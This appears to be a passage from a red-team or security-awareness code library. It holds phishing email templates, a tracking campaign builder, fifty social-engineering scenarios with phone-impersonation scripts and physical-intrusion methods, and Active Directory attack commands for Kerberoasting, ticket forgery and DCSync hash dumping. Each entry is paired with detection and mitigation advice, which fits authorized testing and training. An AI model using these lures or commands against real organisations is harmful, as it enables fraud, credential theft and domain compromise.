    subject: "Invoice #{{invoice_num}} - Payment Due",
    category: "attachment",
    pretext: "Accounts payable sending a legitimate invoice",
    body: `Hello {{first_name}},

Please find attached invoice #{{invoice_num}} for the amount of {{amount}}.

Payment is due by {{due_date}}. Please process this payment at your earliest convenience.

If you have any questions, please contact {{contact_name}} at {{contact_email}}.

Best regards,
{{sender_name}}
{{sender_title}}
{{company}}`,
    variables: ["first_name", "invoice_num", "amount", "due_date", "contact_name", "contact_email", "sender_name", "sender_title", "company"],
    attachment_types: ["macro-enabled Word doc", "PDF with embedded link", "HTML attachment"],
    indicators_of_phishing: ["unexpected invoice", "attachment", "urgency"],
    red_flags_for_training: ["Attachment from unknown sender", "Invoice you weren't expecting", "Urgency around payment"],
  },
  {
    name: "MFA Reset",
    subject: "Multi-Factor Authentication Reset Required",
    category: "credential-harvest",
    pretext: "Security team requiring MFA re-enrollment",
    body: `Dear {{first_name}},

As part of {{company}}'s ongoing security improvements, we are requiring all employees to re-enroll their multi-factor authentication by {{deadline}}.

Please complete re-enrollment here: {{link}}

You will need your current password and your registered phone number to complete this process.

Failure to re-enroll by {{deadline}} will result in temporary loss of access to {{company}} systems.

Information Security Team
{{company}}`,
    variables: ["first_name", "company", "deadline", "link"],
    indicators_of_phishing: ["MFA re-enrollment", "urgency", "credential harvesting via fake enrollment page"],
    red_flags_for_training: ["Asking for password via link", "Threat of access loss", "No IT ticket reference"],
  },
  {
    name: "Voicemail Notification",
    subject: "New Voicemail from {{caller_number}}",
    category: "credential-harvest",
    pretext: "Unified communications voicemail notification",
    body: `You have a new voicemail message.

From: {{caller_number}}
Date: {{date}}
Duration: {{duration}}

Listen to voicemail: {{link}}

This message was sent automatically by the {{company}} phone system.`,
    variables: ["caller_number", "date", "duration", "link", "company"],
    indicators_of_phishing: ["voicemail lure", "curiosity-driven click"],
    red_flags_for_training: ["External link for internal voicemail", "No caller ID name", "HTML email for phone notification"],
  },
  {
    name: "IT Service Desk",
    subject: "Ticket #{{ticket_num}} - System Access Issue",
    category: "credential-harvest",
    pretext: "IT helpdesk follow-up on a support ticket",
    body: `Hi {{first_name}},

We received a report of unusual activity on your account. Ticket #{{ticket_num}} has been created.

To verify your identity and resolve this issue, please confirm your credentials at the link below:

{{link}}

If you did not report this issue, it is important that you verify your account immediately to prevent unauthorized access.

{{company}} IT Service Desk
{{support_phone}}`,
    variables: ["first_name", "ticket_num", "link", "company", "support_phone"],
    indicators_of_phishing: ["account verification request", "urgency", "fear of unauthorized access"],
    red_flags_for_training: ["Verify credentials via external link", "You didn't open a ticket", "Fear-based language"],
  },
  {
    name: "Salary Update",
    subject: "Important: {{year}} Salary Adjustment Notice",
    category: "credential-harvest",
    pretext: "HR department notification about compensation changes",
    body: `Dear {{first_name}},

The {{year}} compensation review has been completed. Your salary has been adjusted effective {{effective_date}}.

To view your updated compensation details, please sign in to the HR portal:

{{link}}

This information is confidential. Please do not share this link with colleagues.

Human Resources Department
{{company}}`,
    variables: ["first_name", "year", "effective_date", "link", "company"],
    indicators_of_phishing: ["salary/compensation lure", "curiosity and self-interest", "confidentiality pressure"],
    red_flags_for_training: ["External HR portal link", "Generic communication for sensitive salary info", "No manager CC"],
  },
  {
    name: "Meeting Invite",
    subject: "Updated: {{meeting_topic}} - {{date}}",
    category: "credential-harvest",
    pretext: "Calendar invite update from a known colleague",
    body: `{{sender_name}} has updated the meeting:

{{meeting_topic}}
Date: {{date}} at {{time}}
Location: {{location}}

Updated agenda and materials: {{link}}

Please review before the meeting.

Sent via {{company}} Calendar`,
    variables: ["sender_name", "meeting_topic", "date", "time", "location", "link", "company"],
    indicators_of_phishing: ["meeting update with link", "impersonation of colleague"],
    red_flags_for_training: ["External link for meeting materials", "Sender email doesn't match calendar system", "No actual calendar attachment"],
  },
];

export function buildPhishingCampaign(templateIndex, variables, options = {}) {
  const template = PHISHING_TEMPLATES[templateIndex] || PHISHING_TEMPLATES[0];
  let subject = template.subject;
  let body = template.body;
  for (const [key, value] of Object.entries(variables)) {
    const re = new RegExp(`\\{\\{${key}\\}\\}`, "g");
    subject = subject.replace(re, value);
    body = body.replace(re, value);
  }
  return {
    subject,
    body,
    category: template.category,
    pretext: template.pretext,
    indicators: template.indicators_of_phishing,
    trainingPoints: template.red_flags_for_training,
    attachmentTypes: template.attachment_types || [],
    tracking: {
      openPixel: options.trackOpens ? `<img src="${variables.link || ''}/track/open/{{uid}}" width="1" height="1" style="display:none">` : null,
      clickTracking: options.trackClicks ? `${variables.link || ''}/track/click/{{uid}}` : null,
    },
  };
}

// ═══════════════════════════════════════════════════════════════════════════════
// SOCIAL ENGINEERING PLAYBOOK LIBRARY
// ═══════════════════════════════════════════════════════════════════════════════

export const SOCIAL_ENGINEERING_SCENARIOS = [
  // Phishing scenarios
  { id: 1, type: "phishing", name: "Executive Impersonation (CEO Fraud)", difficulty: "medium", description: "Impersonate a C-level executive to request urgent wire transfer or sensitive data", pretext: "CEO is traveling and needs an urgent favor", target: "Finance team, executive assistant", success_indicators: ["Wire transfer initiated", "Sensitive data sent", "Gift cards purchased"], countermeasures: ["Out-of-band verification for financial requests", "Executive communication policy", "Wire transfer dual-authorization"] },
  { id: 2, type: "phishing", name: "Vendor Invoice Fraud", difficulty: "medium", description: "Send a fake invoice from a known vendor with updated payment details", pretext: "Vendor has changed their bank account and needs payment redirected", target: "Accounts payable", success_indicators: ["Payment sent to new account", "Bank details updated in system"], countermeasures: ["Vendor verification procedures", "Payment change confirmation calls", "Dual authorization for bank detail changes"] },
  { id: 3, type: "phishing", name: "IT Support Impersonation", difficulty: "easy", description: "Impersonate IT support to collect credentials or install remote access", pretext: "Scheduled security update requires credential verification", target: "Non-technical staff", success_indicators: ["Credentials provided", "Remote access software installed", "MFA token shared"], countermeasures: ["IT communication procedures", "Callback verification", "Never share credentials policy"] },
  { id: 4, type: "phishing", name: "LinkedIn Recruiter", difficulty: "easy", description: "Pose as a recruiter to get employees to open malicious job descriptions", pretext: "Exciting career opportunity matching their profile", target: "Any employee", success_indicators: ["Opened attachment", "Visited credential-harvesting page", "Provided resume with personal info"], countermeasures: ["Security awareness about job scam phishing", "Restrict personal email on work devices"] },
  { id: 5, type: "phishing", name: "Tax Season / W-2 Request", difficulty: "medium", description: "Request W-2 or tax forms from HR during tax season", pretext: "New tax filing system requires all W-2s to be resubmitted", target: "HR/Payroll department", success_indicators: ["W-2 forms sent", "SSN/tax ID data sent"], countermeasures: ["Strict PII handling procedures", "Verification for bulk data requests", "Data classification training"] },

  // Vishing (phone) scenarios
  { id: 6, type: "vishing", name: "Help Desk Impersonation", difficulty: "easy", description: "Call employees pretending to be IT help desk to gather credentials", script: "Hi, this is [name] from IT support. We're seeing some unusual activity on your account and need to verify your identity. Can you confirm your employee ID and current password so we can check?", target: "Non-technical employees", success_indicators: ["Password shared", "MFA code shared", "Remote access granted"], countermeasures: ["Help desk uses tickets, never asks for passwords", "Callback verification procedures"] },
  { id: 7, type: "vishing", name: "Vendor Support Call", difficulty: "medium", description: "Call pretending to be from a software vendor requiring access for an urgent update", script: "Hello, this is [name] from [vendor] support. We've detected a critical vulnerability in your [product] deployment that needs immediate patching. I'll need remote access to apply the fix. Can you provide your credentials or connect me via TeamViewer?", target: "IT staff, system administrators", success_indicators: ["Remote access granted", "VPN credentials shared", "Software installed"], countermeasures: ["Vendor contact verification", "Support case number requirement", "No unscheduled remote access"] },
  { id: 8, type: "vishing", name: "Bank Account Verification", difficulty: "medium", description: "Call finance team pretending to be the company's bank", script: "Hello, this is [name] from [bank] fraud prevention. We've detected suspicious activity on your corporate account ending in [last4]. I need to verify some details to prevent the account from being frozen.", target: "Finance/treasury team", success_indicators: ["Account details shared", "OTP provided", "Authorization given"], countermeasures: ["Bank communication procedures", "Callback to known bank numbers", "Never share OTPs"] },
  { id: 9, type: "vishing", name: "Executive Urgent Request", difficulty: "hard", description: "Call pretending to be CEO/CFO requesting emergency wire transfer", script: "Hey [name], it's [CEO name]. I'm in a meeting right now and can't email. I need you to wire $[amount] to this account right away for a time-sensitive deal. I'll explain when I'm out. Can you handle this?", target: "Finance team, executive assistant", success_indicators: ["Wire transfer initiated", "No verification performed"], countermeasures: ["Dual authorization for all wire transfers", "Out-of-band verification", "AI voice cloning awareness training"] },
  { id: 10, type: "vishing", name: "Survey/Research Call", difficulty: "easy", description: "Call pretending to conduct a business survey to gather intelligence", script: "Hi, we're conducting a survey on behalf of [industry association] about technology adoption in [sector]. It'll only take 5 minutes. What email system does your company use? What's your IT department structure?", target: "Any employee, receptionist", success_indicators: ["Technology stack revealed", "Org structure shared", "Employee names gathered"], countermeasures: ["Information sharing policies", "Media/external communication training"] },

  // Physical access scenarios
  { id: 11, type: "physical", name: "Tailgating", difficulty: "easy", description: "Follow an authorized employee through a secure entrance", technique: "Wait near the entrance with hands full (carrying boxes or laptop bag), approach as someone badges in, and walk in behind them. Most people will hold the door.", target: "Building entrance, server room, restricted floors", success_indicators: ["Gained physical access", "No challenge from employees"], countermeasures: ["Anti-tailgating awareness training", "Mantrap entrances", "Security guard presence"] },
  { id: 12, type: "physical", name: "Fake Delivery", difficulty: "easy", description: "Arrive dressed as a delivery person with a package", technique: "Wear a delivery uniform or vest, carry a labeled box addressed to a real employee (found via LinkedIn). Ask the receptionist to deliver it or offer to bring it directly to the person's desk.", target: "Lobby, mail room, individual offices", success_indicators: ["Escorted past security", "Unescorted access granted", "USB drop completed"], countermeasures: ["Visitor management procedures", "Delivery receiving protocols", "Badge requirement for all floors"] },
  { id: 13, type: "physical", name: "IT Contractor", difficulty: "medium", description: "Arrive as an IT contractor scheduled for maintenance", technique: "Dress professionally, carry a laptop bag and tools. Tell reception you're from [vendor] and have a scheduled server maintenance window. Reference a ticket number. Ask to be escorted to the server room.", target: "Server rooms, network closets, data centers", success_indicators: ["Access to server room", "Plugged in network implant", "Photographed configurations"], countermeasures: ["Contractor verification with IT", "Escort policy", "Contractor badge with different color/access"] },
  { id: 14, type: "physical", name: "USB Drop", difficulty: "easy", description: "Leave malicious USB drives in common areas", technique: "Label USB drives with enticing labels ('Salary Data 2026', 'Confidential', 'CEO_photos') and leave them in parking lots, break rooms, bathrooms, and elevators.", target: "All employees", success_indicators: ["USB plugged into corporate machine", "Payload executed", "Callback received"], countermeasures: ["USB port blocking", "Security awareness training about USB drops", "Group policy restricting removable media"] },
  { id: 15, type: "physical", name: "Interview/Job Candidate", difficulty: "medium", description: "Schedule a fake interview to gain building access", technique: "Apply for an open position, get invited for an interview. During the visit, survey the building layout, take photos, note badge readers, identify network jacks, and plant devices.", target: "HR/reception, entire building", success_indicators: ["Full building reconnaissance", "Wireless implant placed", "Access badge cloned"], countermeasures: ["Escort policy for all visitors", "Limited interview room access", "Visitor Wi-Fi only"] },

  // SMiShing scenarios
  { id: 16, type: "smishing", name: "Package Delivery", difficulty: "easy", description: "Send SMS pretending to be a delivery service with a tracking link", pretext: "Your package could not be delivered. Click to reschedule.", target: "Any employee", success_indicators: ["Link clicked", "Credentials entered on fake page"], countermeasures: ["SMS security awareness", "Don't click unexpected links"] },
  { id: 17, type: "smishing", name: "MFA Push Fatigue", difficulty: "medium", description: "Repeatedly trigger MFA push notifications until the user approves", pretext: "Something is wrong with the system, just approve to stop the notifications", target: "Any MFA-enrolled user", success_indicators: ["MFA push approved", "Account compromised"], countermeasures: ["Number matching in MFA", "MFA push notification limits", "User training on push fatigue attacks"] },

  // Advanced scenarios
  { id: 18, type: "advanced", name: "Watering Hole Attack", difficulty: "hard", description: "Compromise a website frequently visited by target employees", technique: "Identify websites commonly visited by target group (industry forums, conference sites). Compromise the site or create a lookalike. Serve exploits or credential-harvesting pages.", target: "Specific department or role", success_indicators: ["Credentials harvested", "Exploit delivered", "Initial access gained"], countermeasures: ["Web filtering", "Browser isolation", "DNS security"] },
  { id: 19, type: "advanced", name: "Evil Twin WiFi", difficulty: "medium", description: "Set up a rogue WiFi access point mimicking the corporate network", technique: "Deploy a portable AP with the same SSID as the corporate WiFi. Use deauth attacks to force clients off the real AP. Capture credentials from the captive portal or perform MITM.", target: "Any employee with wireless device", success_indicators: ["Clients connected to evil twin", "Credentials captured", "MITM established"], countermeasures: ["802.1X/RADIUS authentication", "WPA3 Enterprise", "Evil twin detection", "VPN-always-on policy"] },
  { id: 20, type: "advanced", name: "Supply Chain Impersonation", difficulty: "hard", description: "Impersonate a trusted supplier to inject malicious updates", technique: "Register a lookalike domain for a known vendor. Send email from the lookalike domain with a 'critical security update' that installs a backdoor.", target: "IT administrators, developers", success_indicators: ["Malicious update installed", "Backdoor established"], countermeasures: ["Software signing verification", "Update verification procedures", "Domain monitoring for typosquatting"] },

  // More scenarios for coverage
  { id: 21, type: "phishing", name: "Microsoft 365 Alert", difficulty: "easy", description: "Fake Microsoft 365 security alert about unusual sign-in activity", pretext: "Unusual sign-in activity detected on your Microsoft 365 account", target: "Any employee with M365 account", success_indicators: ["Credentials entered on phishing page", "MFA token captured"], countermeasures: ["Phishing-resistant MFA (FIDO2)", "Conditional access policies", "User training on Microsoft alerts"] },
  { id: 22, type: "phishing", name: "Shared Folder Access", difficulty: "easy", description: "Notification about being added to a shared OneDrive/SharePoint folder", pretext: "A colleague has added you to a project folder", target: "Any employee", success_indicators: ["Credential harvesting page visited", "Credentials entered"], countermeasures: ["Check sender authenticity", "Hover over links before clicking"] },
  { id: 23, type: "vishing", name: "Compliance Audit Call", difficulty: "medium", description: "Call pretending to be from the compliance/audit team", script: "Hello, I'm [name] from [audit firm]. We're conducting the annual compliance review and need to verify some access controls. Can you walk me through your login process and what systems you have access to?", target: "Any employee, IT staff", success_indicators: ["Access control details shared", "System architecture revealed", "Process weaknesses identified"], countermeasures: ["Audit notification procedures", "Verification with management"] },
  { id: 24, type: "physical", name: "Dumpster Diving", difficulty: "easy", description: "Search through trash and recycling for sensitive documents", technique: "Access dumpsters or recycling bins outside the building after business hours. Look for printed documents, sticky notes with passwords, discarded hardware, or backup media.", target: "Building exterior, loading docks", success_indicators: ["Sensitive documents found", "Passwords found", "Hardware obtained"], countermeasures: ["Shredding policy", "Secure disposal bins", "Clean desk policy"] },
  { id: 25, type: "physical", name: "Badge Cloning", difficulty: "hard", description: "Clone an employee's access badge using a portable reader", technique: "Use a Proxmark or similar device to read an employee's badge at close range (elevator, lunch area). Clone to a blank card. Use cloned badge for after-hours access.", target: "Any badged employee", success_indicators: ["Badge data captured", "Badge cloned successfully", "Access gained with cloned badge"], countermeasures: ["iCLASS SE / SEOS (encrypted badges)", "Badge monitoring for anomalies", "Anti-cloning badge technology"] },

  // More for the 50+ target
  { id: 26, type: "phishing", name: "DocuSign Impersonation", difficulty: "easy", description: "Fake DocuSign notification to harvest credentials", pretext: "Document ready for your signature", target: "Anyone who uses e-signatures", success_indicators: ["Credential page visited", "Password entered"], countermeasures: ["Verify DocuSign emails via the platform directly"] },
  { id: 27, type: "phishing", name: "Zoom Meeting Invite", difficulty: "easy", description: "Fake Zoom meeting notification with credential-harvesting link", pretext: "You've been invited to an urgent meeting", target: "Remote workers", success_indicators: ["Clicked link", "Entered credentials"], countermeasures: ["Verify meeting invites in calendar app"] },
  { id: 28, type: "phishing", name: "Cloud Storage Quota Warning", difficulty: "easy", description: "Notification that cloud storage is 95% full", pretext: "Your OneDrive/Google Drive is almost full — upgrade now", target: "Any cloud user", success_indicators: ["Clicked upgrade link", "Entered credentials"], countermeasures: ["Check storage via the actual platform"] },
  { id: 29, type: "vishing", name: "Insurance Verification", difficulty: "easy", description: "Call HR pretending to be from the health insurance provider", script: "Hello, I'm calling from [insurance company] regarding your group plan. We need to verify employee information for the annual renewal.", target: "HR department", success_indicators: ["Employee PII shared", "Plan details revealed"], countermeasures: ["Insurance verification procedures", "Callback to known numbers"] },
  { id: 30, type: "vishing", name: "Law Enforcement Impersonation", difficulty: "hard", description: "Call pretending to be law enforcement requesting information", script: "This is Detective [name] with [jurisdiction]. We're investigating a fraud case and your company may be involved. I need to verify some account information to clear this up. This is time-sensitive.", target: "Any employee, legal team", success_indicators: ["Information shared without legal review", "Cooperation without verification"], countermeasures: ["All law enforcement requests go through legal", "Verification procedures", "Never share data on inbound calls"] },
  { id: 31, type: "physical", name: "Fire Alarm Social Engineering", difficulty: "medium", description: "Pull fire alarm to cause evacuation, then access the empty building", technique: "Trigger fire alarm, wait for evacuation, enter through propped-open emergency exit during confusion.", target: "Entire building", success_indicators: ["Access during evacuation", "Planted devices", "Photographed sensitive areas"], countermeasures: ["Post-evacuation re-entry procedures", "Emergency access monitoring", "Security remains during evacuations"] },
  { id: 32, type: "physical", name: "Cleaning Crew Impersonation", difficulty: "medium", description: "Pose as a member of the cleaning crew to gain after-hours access", technique: "Obtain cleaning crew schedule and uniform style. Arrive during cleaning shift. Access offices, photograph screens, check for passwords on sticky notes.", target: "All offices after hours", success_indicators: ["Accessed restricted areas", "Found passwords/credentials", "Planted listening devices"], countermeasures: ["Background checks for cleaning staff", "Restricted area access for cleaning", "Clean desk policy enforcement"] },
  { id: 33, type: "advanced", name: "QR Code Phishing", difficulty: "easy", description: "Place malicious QR codes in common areas or send via email", technique: "Create QR codes that redirect to credential-harvesting pages. Place on posters in common areas ('Scan for WiFi password', 'Scan for menu') or embed in emails.", target: "Any mobile device user", success_indicators: ["QR code scanned", "Credential page visited", "Malware installed"], countermeasures: ["QR code scanning awareness training", "QR code preview before opening"] },
  { id: 34, type: "advanced", name: "AI Voice Cloning", difficulty: "hard", description: "Use AI to clone an executive's voice for vishing attacks", technique: "Obtain audio samples of the executive (earnings calls, YouTube, podcasts). Use AI voice cloning to generate realistic audio. Call employees with urgent requests.", target: "Finance team, executive assistants", success_indicators: ["Voice recognized as authentic", "Request carried out"], countermeasures: ["Duress words/code phrases", "Out-of-band verification for financial requests", "AI voice detection tools"] },
  { id: 35, type: "advanced", name: "Browser-in-the-Browser", difficulty: "medium", description: "Create a fake browser window inside a web page to mimic SSO login", technique: "Craft a web page with a realistic fake browser popup that looks like a Microsoft/Google login window. Deploy on a phishing page.", target: "Any SSO-enabled user", success_indicators: ["Credentials entered in fake window"], countermeasures: ["Drag login window outside browser to verify", "FIDO2/passwordless authentication", "Password manager (won't autofill on fake domain)"] },

  // Additional scenarios to reach 50+
  { id: 36, type: "phishing", name: "Bonus/Reward Notification", difficulty: "easy", description: "Fake email about a bonus or reward program", pretext: "You've been selected for a quarterly performance bonus", target: "Any employee", success_indicators: ["Clicked link", "Entered HR credentials"], countermeasures: ["Verify with HR/manager directly"] },
  { id: 37, type: "phishing", name: "Security Training Reminder", difficulty: "medium", description: "Fake mandatory security training notification", pretext: "Complete your annual security awareness training by Friday", target: "All employees", success_indicators: ["Clicked fake training link", "Entered credentials"], countermeasures: ["Verify training links via intranet", "Check with security team"] },
  { id: 38, type: "phishing", name: "Account Suspension Notice", difficulty: "easy", description: "Warning that email account will be suspended", pretext: "Your email account has been flagged for violation of company policy", target: "Any employee", success_indicators: ["Panic-clicked verify link", "Entered credentials"], countermeasures: ["IT never sends suspension notices via email"] },
  { id: 39, type: "vishing", name: "Printer/Copier Vendor", difficulty: "easy", description: "Call pretending to be the printer vendor for a toner delivery scam", script: "Hi, I'm calling about your copier contract. We need to confirm the model number and serial for your scheduled toner delivery. Can you check the label on the machine?", target: "Office staff, receptionist", success_indicators: ["Equipment details shared", "Unauthorized delivery accepted"], countermeasures: ["Vendor management procedures", "No unsolicited vendor calls"] },
  { id: 40, type: "physical", name: "Food Delivery Driver", difficulty: "easy", description: "Arrive with food delivery to gain entry past reception", technique: "Order delivery to the building, intercept the driver or bring your own food. Use the delivery as pretext to access office areas.", target: "Office common areas", success_indicators: ["Past reception without badge", "Access to multiple floors"], countermeasures: ["Delivery area separate from offices", "Badge-only elevator access"] },
  { id: 41, type: "smishing", name: "IT Password Reset SMS", difficulty: "medium", description: "Send SMS pretending to be from IT about a password reset", pretext: "Your corporate password has been reset. Click to set a new one.", target: "Any employee", success_indicators: ["Clicked reset link", "Entered new and old credentials"], countermeasures: ["IT never sends password reset via SMS"] },
  { id: 42, type: "advanced", name: "Adversary-in-the-Middle Proxy", difficulty: "hard", description: "Set up a proxy to capture authentication tokens in real-time", technique: "Use tools like Evilginx2 to create a transparent proxy that captures session tokens, bypassing MFA.", target: "Any user with web-based SSO", success_indicators: ["Session token captured", "MFA bypassed", "Account accessed"], countermeasures: ["FIDO2/WebAuthn", "Token binding", "Phishing-resistant MFA"] },
  { id: 43, type: "advanced", name: "Internal Spearphishing", difficulty: "medium", description: "After initial compromise, send phishing from a legitimate internal account", technique: "Compromise one account, then send phishing to other employees from the trusted internal address.", target: "Colleagues of compromised user", success_indicators: ["Higher click rate due to trusted sender", "Additional accounts compromised"], countermeasures: ["Internal email anomaly detection", "Behavior-based email filtering"] },
  { id: 44, type: "physical", name: "Shoulder Surfing", difficulty: "easy", description: "Observe employees entering passwords or sensitive information", technique: "Position yourself near employees as they type credentials. Coffee shops, airports, and open offices are prime locations.", target: "Mobile workers, anyone in public", success_indicators: ["Password observed", "PIN captured"], countermeasures: ["Privacy screens", "Biometric authentication", "Security awareness"] },
  { id: 45, type: "physical", name: "Impersonating a Fire Inspector", difficulty: "medium", description: "Arrive as a fire safety inspector to gain building access", technique: "Wear appropriate clothing, carry a clipboard, and claim a routine fire safety inspection. Request access to all areas including server rooms and restricted areas.", target: "Facility management, receptionist", success_indicators: ["Full building access", "Server room access", "Photographs of equipment"], countermeasures: ["Scheduled inspection verification", "Contact fire department directly", "Escort policy"] },
  { id: 46, type: "vishing", name: "Telecom Provider Impersonation", difficulty: "medium", description: "Call pretending to be from the telecom provider about line maintenance", script: "Hello, this is [name] from [telecom]. We're doing scheduled maintenance on your lines. I need to verify your account number and the authorized contacts on the account to ensure uninterrupted service.", target: "IT staff, office management", success_indicators: ["Account information shared", "Access credentials for telecom portal provided"], countermeasures: ["Verify with telecom via known numbers", "Account PIN/passphrase requirement"] },
  { id: 47, type: "phishing", name: "Board Meeting Agenda", difficulty: "hard", description: "Send fake board meeting agenda to executives with malicious attachment", pretext: "Updated agenda for tomorrow's board meeting", target: "C-level executives, board members", success_indicators: ["Attachment opened", "Macro enabled", "Initial access gained"], countermeasures: ["Executive protection program", "Attachment sandboxing", "Board communication procedures"] },
  { id: 48, type: "advanced", name: "Rogue Charging Station", difficulty: "medium", description: "Set up a fake charging station that harvests data from connected phones", technique: "Place a modified charging station in a conference room or lobby. The station uses USB data connection to extract data or install malware on connected phones.", target: "Mobile device users", success_indicators: ["Devices connected", "Data harvested", "Malware installed"], countermeasures: ["Use own chargers and cables", "USB data blockers", "Charge-only USB cables"] },
  { id: 49, type: "advanced", name: "Deepfake Video Conference", difficulty: "hard", description: "Use deepfake technology to impersonate an executive on video call", technique: "Create a real-time deepfake of a known executive. Join a video conference as the executive to authorize transactions or share sensitive information.", target: "Finance team, senior leadership", success_indicators: ["Impersonation accepted", "Unauthorized actions taken"], countermeasures: ["Challenge questions", "Out-of-band verification", "Deepfake detection tools"] },
  { id: 50, type: "phishing", name: "Browser Extension Phishing", difficulty: "medium", description: "Trick users into installing a malicious browser extension", pretext: "Install this security extension required by IT for compliance", target: "Any employee with browser", success_indicators: ["Extension installed", "Browser data exfiltrated", "Session tokens stolen"], countermeasures: ["Browser extension policies", "Managed Chrome/Edge profiles", "Extension allowlisting"] },
];

// ═══════════════════════════════════════════════════════════════════════════════
// ACTIVE DIRECTORY ATTACK PATHS
// ═══════════════════════════════════════════════════════════════════════════════

export const AD_ATTACKS = {
  kerberoasting: {
    name: "Kerberoasting",
    technique_id: "T1558.003",
    description: "Request TGS tickets for service accounts and crack them offline to obtain plaintext passwords",
    prerequisites: ["Any domain user account", "Service accounts with SPNs registered"],
    commands: {
      enumerate_spns: [
        "# PowerShell — find service accounts with SPNs",
        "Get-ADUser -Filter {ServicePrincipalName -ne '$null'} -Properties ServicePrincipalName | Select Name, ServicePrincipalName",
        "",
        "# Rubeus",
        "Rubeus.exe kerberoast /stats",
        "",
        "# Impacket",
        "GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.1",
      ],
      request_tickets: [
        "# Rubeus — request and output hashcat format",
        "Rubeus.exe kerberoast /outfile:hashes.txt /format:hashcat",
        "",
        "# Impacket",
        "GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.1 -request -outputfile hashes.txt",
        "",
        "# PowerShell (no tools)",
        "Add-Type -AssemblyName System.IdentityModel",
        "$spn = 'MSSQLSvc/db01.domain.local:1433'",
        "New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn",
      ],
      crack_hashes: [
        "# Hashcat — mode 13100 for Kerberos 5 TGS-REP",
        "hashcat -m 13100 hashes.txt wordlist.txt -r rules/best64.rule",
        "",
        "# John the Ripper",
        "john hashes.txt --wordlist=wordlist.txt --format=krb5tgs",
      ],
    },
    detection: [
      "Event ID 4769 — Kerberos Service Ticket Operations (high volume from single user)",
      "Event ID 4769 with Ticket Encryption Type 0x17 (RC4) — downgrade attack indicator",
      "Monitor for TGS requests to many different SPNs from one account",
    ],
    mitigation: [
      "Use Group Managed Service Accounts (gMSA) with 120+ character passwords",
      "Enforce AES256 encryption for service accounts",
      "Set long, complex passwords for service accounts (25+ chars)",
      "Monitor for Kerberoasting patterns (many TGS requests)",
      "Remove unnecessary SPNs from accounts",
    ],
  },
  asrep_roasting: {
    name: "AS-REP Roasting",
    technique_id: "T1558.004",
    description: "Find accounts that don't require Kerberos pre-authentication and request encrypted AS-REP to crack offline",
    prerequisites: ["Any domain user or unauthenticated access", "Accounts with 'Do not require Kerberos preauthentication' enabled"],
    commands: {
      enumerate: [
        "# PowerShell — find accounts without pre-auth",
        "Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth | Select Name",
        "",
        "# Rubeus",
        "Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt",
        "",
        "# Impacket (can enumerate without creds)",
        "GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt -dc-ip 10.10.10.1",
      ],
      crack: [
        "# Hashcat — mode 18200 for Kerberos 5 AS-REP",
        "hashcat -m 18200 asrep.txt wordlist.txt -r rules/best64.rule",
      ],
    },
    detection: [
      "Event ID 4768 — Kerberos Authentication Service (AS) with Pre-Authentication Type 0",
      "Look for AS-REQ without pre-authentication data",
    ],
    mitigation: [
      "Ensure all accounts require Kerberos pre-authentication",
      "Audit accounts with this flag disabled regularly",
      "Strong passwords on accounts that must have pre-auth disabled",
    ],
  },
  golden_ticket: {
    name: "Golden Ticket",
    technique_id: "T1558.001",
    description: "Forge a Kerberos TGT using the KRBTGT account's password hash, granting unrestricted access to the entire domain",
    prerequisites: ["KRBTGT account NTLM hash (obtained via DCSync or ntds.dit extraction)", "Domain SID"],
    commands: {
      create: [
        "# Mimikatz — create golden ticket",
        "kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:NTLM_HASH /id:500 /ptt",
        "",
        "# Rubeus",
        "Rubeus.exe golden /aes256:AES_KEY /user:Administrator /domain:domain.local /sid:S-1-5-21-... /ptt",
        "",
        "# Impacket — create and save to file",
        "ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain domain.local Administrator",
        "export KRB5CCNAME=Administrator.ccache",
        "psexec.py domain.local/Administrator@dc01 -k -no-pass",
      ],
    },
    detection: [
      "Event ID 4769 — TGS request with invalid/forged TGT",
      "TGT lifetime exceeding domain policy (default golden ticket is 10 years)",
      "Account logon events for non-existent users",
      "Microsoft Defender for Identity — Golden Ticket alert",
    ],
    mitigation: [
      "Reset KRBTGT password twice (both current and previous hashes)",
      "Rotate KRBTGT password every 180 days",
      "Monitor for anomalous Kerberos activity",
      "Use Microsoft Defender for Identity",
    ],
  },
  silver_ticket: {
    name: "Silver Ticket",
    technique_id: "T1558.002",
    description: "Forge a Kerberos service ticket using a service account's password hash, granting access to that specific service",
    prerequisites: ["Target service account's NTLM hash", "Domain SID", "Service SPN"],
    commands: {
      create: [
        "# Mimikatz — create silver ticket for CIFS (file share access)",
        "kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /target:fileserver.domain.local /service:cifs /rc4:SERVICE_NTLM /ptt",
        "",
        "# For MSSQL access",
        "kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /target:sqlserver.domain.local /service:MSSQLSvc /rc4:SERVICE_NTLM /ptt",
        "",
        "# Impacket",
        "ticketer.py -nthash SERVICE_NTLM -domain-sid S-1-5-21-... -domain domain.local -spn cifs/fileserver.domain.local Administrator",
      ],
    },
    detection: [
      "Silver tickets don't interact with the DC — no Event ID 4769 on the DC",
      "Look for service access without corresponding TGS request on the DC",
      "PAC validation failures (if enabled)",
      "Event ID 4624 on the target server with no corresponding DC authentication",
    ],
    mitigation: [
      "Use Group Managed Service Accounts (gMSA)",
      "Enable PAC validation on services",
      "Rotate service account passwords",
      "Monitor for TGS requests that bypass the KDC",
    ],
  },
  dcsync: {
    name: "DCSync",
    technique_id: "T1003.006",
    description: "Simulate domain controller replication to extract password hashes from Active Directory without running code on a DC",
    prerequisites: ["Account with 'Replicating Directory Changes' and 'Replicating Directory Changes All' permissions (typically Domain Admins)"],
    commands: {
      execute: [
        "# Mimikatz — dump specific user",
        "lsadump::dcsync /user:domain\\krbtgt /domain:domain.local",
        "",
        "# Mimikatz — dump all users",
        "lsadump::dcsync /domain:domain.local /all /csv",
        "",
        "# Impacket",
        "secretsdump.py domain.local/admin:password@dc01.domain.local -just-dc-ntlm",
        "",
        "# Impacket — specific user",
        "secretsdump.py domain.local/admin:password@dc01.domain.local -just-dc-user krbtgt",
      ],
    },
    detection: [
      "Event ID 4662 — Object access with replication-related GUIDs",
